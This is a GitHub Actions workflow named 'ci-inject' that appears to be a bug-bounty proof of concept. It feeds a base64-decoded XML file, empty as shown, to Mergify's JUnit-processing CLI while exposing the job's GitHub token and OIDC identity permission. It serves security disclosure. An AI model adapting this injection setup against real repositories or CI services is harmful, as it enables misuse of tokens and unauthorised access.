name: ci-inject
on: push
permissions:
  id-token: write
  contents: read
jobs:
  inject:
    runs-on: ubuntu-latest
    steps:
      - run: echo  | base64 -d > j.xml
      - run: pip install mergify-cli
      - run: mergify ci junit-process --repository researcher-intigriti/test-repo-poc --tests-target-branch main j.xml || true
        env:
          GITHUB_TOKEN: ${{ github.token }}
